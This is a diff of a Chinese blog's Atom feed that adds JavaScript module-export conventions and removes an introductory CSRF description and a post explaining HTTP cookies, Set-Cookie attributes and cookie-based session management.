+<h3 id="输出模块">输出模块</h3>
+<p>使用<code>export</code>输出变量，拒绝<code>module.exports</code>:</p>
+<pre><code class="language-js">import React from 'react';
+
+class Breadcrumbs extends React.Component {
+  render() {
+    return &lt;nav /&gt;;
+  }
+};
+
+export default Breadcrumbs;
+</code></pre>
 <ul>
-<li>利用已通过认证的用户权限更新设定信息等</li>
-<li>利用已通过认证的用户权限购买商品</li>
-<li>利用已通过认证的用户权限在留言板上发表言论</li>
+<li>输出单个值，使用<code>export default</code></li>
+<li>输出多个值，使用<code>export</code></li>
+<li><code>export default</code>与普通的<code>export</code>不要同时使用</li>
 </ul>
-<h3 id="跨站点请求伪造的攻击案例">跨站点请求伪造的攻击案例</h3>
-<p>下面以留言板功能为例，讲解跨站点请求伪造。该功能只允许已认证并登录的用户在留言板上发表内容。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-aa8130ff059c20c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="跨站点请求伪造的攻击案例"></p>
-<p>在该留言板系统上，受害者用户A 是已认证状态。它的浏览器中的Cookie 持有已认证的会话ID（步骤①）
-攻击者设置好一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户A 的浏览器执行完陷阱中的请求后，留言板上也就会留下那条评论（步骤②）。
-触发陷阱之际，如果用户A 尚未通过认证，则无法利用用户A 的身份权限在留言板上发表内容。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[认识HTTP----Cookie和Session篇]]></title>
-        <id>https://hubingliang.github.io/post/cookie-session</id>
-        <link href="https://hubingliang.github.io/post/cookie-session">
-        </link>
-        <updated>2017-06-19T12:55:27.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>本文内容大多参考<a href="https://book.douban.com/subject/25863515/">《图解HTTP》一书</a></strong></p>
-<h2 id="使用cookie来管理状态">使用Cookie来管理状态</h2>
-<p>HTTP是无状态协议，说明它不能以状态来区分和管理请求和响应。也就是说，无法根据之前的状态进行本次的请求处理。
-不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的CPU 及内存资源的消耗。从另一侧面来说，也正是因为HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-87d0773cc92023ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="如果让服务器管理全部客户端状态则会成为负担"></p>
-<p>我们登录淘宝的时候首先要登录，我们看到了一个商品点进去，进行了页面跳转/刷新，按照HTTP的无状态协议岂不是又要登录一次？</p>
-<p>所以为了解决这个问题，Cookie诞生了，在保留无状态协议这个特征的同时又要解决类似记录状态的矛盾问题。Cookie 技术通过在请求和响应报文中写入Cookie 信息来控制客户端的状态。
-Cookie 会根据从服务器端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie 值后发送出去。
-服务器端发现客户端发送过来的Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</p>
-<ul>
-<li>没有Cookie信息状态下的请求</li>
-</ul>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-59439fc716939f4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<ul>
-<li>第2次以后（存有Cookie信息状态）的请求</li>
-</ul>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-27afc1005246361a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>上图很清晰地展示了发生Cookie 交互的情景。
-HTTP 请求报文和响应报文的内容如下（数字和图中对应）。</p>
-<ol>
-<li>请求报文（没有Cookie 信息的状态）</li>
-</ol>
-<pre><code>GET /reader/ HTTP/1.1
-Host: hackr.jp
-*首部字段内没有Cookie的相关信息
+<h2 id="编码规范">编码规范</h2>
+<p>模块输出一个函数，首字母应该小写：</p>
+<pre><code class="language-js">function getData() {
+}
+
+export default getData;
 </code></pre>
-<ol start="2">
-<li>响应报文（服务器端生成Cookie 信息）</li>
-</ol>
-<pre><code>HTTP/1.1 200 OK
-Date: Thu, 12 Jul 2012 07:12:20 GMT
-Server: Apache
-＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMT＞
-Content-Type: text/plain; charset=UTF-8
+<p>模块输出一个对象，首字母应该大写:</p>
+<pre><code class="language-js">const Person = {
+  someCode: {
+  }
+};
+
+export default Person ;
 </code></pre>
-<ol start="3">
-<li>请求报文（自动发送保存着的Cookie 信息）</li>
-</ol>
-<pre><code>GET /image/ HTTP/1.1
-Host: hackr.jp
-Cookie: sid=1342077140226724
-</code></pre>
-<h2 id="关于cookie-的首部字段">关于Cookie 的首部字段</h2>
-<table>
-<thead>
-<tr>
-<th>首部字段名</th>
-<th style="text-align:center">说明</th>
-<th style="text-align:right">首部类型</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Set-Cookie</td>
-<td style="text-align:center">开始状态管理所使用的Cookie信息</td>
-<td style="text-align:right">响应首部字段</td>
-</tr>
-<tr>
-<td>Cookie</td>
-<td style="text-align:center">服务器接收到的Cookie信息</td>
-<td style="text-align:right">请求首部字段</td>
-</tr>
-</tbody>
-</table>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-6f7ad5a2b69e3d8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<h3 id="set-cookie">Set-Cookie</h3>
-<pre><code>Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; ⇒
-path=/; domain=.hackr.jp;
-</code></pre>
-<p>当服务器准备开始管理客户端的状态时，会事先告知各种信息。下面的表格列举了Set-Cookie 的字段值。</p>
-<h3 id="set-cookie-字段的属性">Set-Cookie 字段的属性</h3>
-<table>
-<thead>
-<tr>
-<th>属性</th>
-<th style="text-align:center">说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>NAME=VALUE</td>
-<td style="text-align:center">赋予Cookie的名称和其值（必需项）</td>
-</tr>
-<tr>
-<td>expires=DATE</td>
-<td style="text-align:center">Cookie的有效期（若不明确指定则默认为浏览器关闭前为止）</td>
-</tr>
-<tr>
-<td>path=PATH</td>
-<td style="text-align:center">将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）</td>
-</tr>
-<tr>
-<td>domain=域名</td>
-<td style="text-align:center">作为Cookie适用对象的域名 （若不指定则默认为创建Cookie的服务器的域名）</td>
-</tr>
-</tbody>
-</table>
-<h4 id="expires-属性">expires 属性</h4>
-<p>Cookie 的expires 属性指定浏览器可发送Cookie 的有效期。当省略expires 属性时，Cookie仅在浏览器关闭之前有效。
-另外，一旦Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除Cookie 的方法。但可通过覆盖已过期的Cookie，实现对客户端Cookie 的实质性删除操作。</p>
-<h4 id="path-属性">path 属性</h4>
-<p>Cookie 的path 属性可用于限制指定Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。</p>
-<h4 id="domain-属性">domain 属性</h4>
-<p>通过Cookie 的domain 属性指定的域名可做到与结尾匹配一致。比如， 当指定example.com 后， 除example.com 以外，www.example.com或www2.example.com 等都可以发送Cookie。因此，除了针对具体指定的多个域名发送Cookie 之外，不指定domain 属性显得更安全。</p>
-<h4 id="secure-属性">secure 属性</h4>
-<p>Cookie 的secure 属性用于限制Web 页面仅在HTTPS 安全连接时，才可以发送Cookie。发送Cookie 时，指定secure 属性的方法如下所示。</p>
-<p><code>Set-Cookie: name=value; secure</code></p>
-<p>以上例子仅当在https ：//www.example.com/（HTTPS）安全连接的情况下才会进行Cookie 的回收。也就是说，即使域名相同时http : //www.example.com/（HTTP） 也不会发生Cookie 回收行为。当省略secure 属性时，不论HTTP 还是HTTPS，都会对Cookie 进行回收。</p>
-<h4 id="httponly-属性">HttpOnly 属性</h4>
-<p>Cookie 的HttpOnly 属性是Cookie 的扩展功能，它使JavaScript 脚本无法获得Cookie。其主要目的为防止跨站脚本攻击（Cross-sitescripting，XSS）对Cookie 的信息窃取。
-发送指定HttpOnly 属性的Cookie 的方法如下所示。</p>
-<p><code>Set-Cookie: name=value; HttpOnly</code></p>
-<p>通过上述设置，通常从Web 页面内还可以对Cookie 进行读取操作。但使用JavaScript 的document.cookie 就无法读取附加HttpOnly 属性后的Cookie 的内容了。因此，也就无法在XSS 中利用JavaScript 劫持Cookie 了。
-虽然是独立的扩展功能，但Internet Explorer 6 SP1 以上版本等当下的主流浏览器都已经支持该扩展了。另外顺带一提，该扩展并非是为了防止XSS 而开发的。</p>
-<h3 id="cookie">Cookie</h3>
-<p><code>Cookie: status=enable</code></p>
-<p>首部字段Cookie 会告知服务器，当客户端想获得HTTP 状态管理支持时，就会在请求中包含从服务器接收到的Cookie。接收到多个Cookie 时，同样可以以多个Cookie 形式发送。</p>
-<h2 id="session-管理及cookie-应用">Session 管理及Cookie 应用</h2>
-<h3 id="什么是session">什么是Session</h3>
-<p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。Session 对象最常见的一个用法就是存储用户的首选项。例如，如果用户指明不喜欢查看图形，就可以将该信息存储在 Session 对象中。</p>
-<h3 id="通过cookie来管理session">通过Cookie来管理Session</h3>
-<p>基于表单认证的标准规范尚未有定论，一般会使用Cookie 来管理Session（会话）。
-基于表单认证本身是通过服务器端的Web 应用，将客户端发送过来的用户ID 和密码与之前登录过的信息做匹配来进行认证的。
-但鉴于HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用Cookie 来管理Session，以弥补HTTP 协议中不存在的状态管理功能。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-d8045757420dd652.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Session 管理及Cookie 状态管理"></p>
-<ul>
-<li><strong>步骤一</strong>：客户端把用户ID 和密码等登录信息放入报文的实体部分，通常是以POST 方法把请求发送给服务器。而这时，会使用HTTPS 通信来进行HTML 表单画面的显示和用户输入数据的发送。</li>
-<li><strong>步骤二</strong>：服务器会发放用以识别用户的Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与Session ID 绑定后记录在服务器端。</li>
-</ul>
-<p>向客户端返回响应时，会在首部字段Set-Cookie 内写入Session ID（如PHPSESSID=028a8c…）。
-你可以把Session ID 想象成一种用以区分不同用户的等位号。然而，如果Session ID 被第三方盗走，对方就可以伪装成你的身份进行恶意操作了。因此必须防止Session ID 被盗，或被猜出。为了做到这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行有效期的管理，保证其安全性。
-另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在Cookie 内加上httponly 属性。</p>
-<ul>
-<li><strong>步骤三</strong>：客户端接收到从服务器端发来的Session ID 后，会将其作为Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送Cookie，所以Session ID 也随之发送到服务器。服务器端可通过验证接收到的Session ID 识别用户和其认证状态。</li>
-</ul>
-<p>除了以上介绍的应用实例，还有应用其他不同方法的案例。
-另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法，服务器端应如何保存用户提交的密码等登录信息等也没有标准化。
-通常，一种安全的保存方法是，先利用给密码加盐（salt）A 的方式增加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码泄露的风险。</p>
 ]]></content>
     </entry>
 </feed>
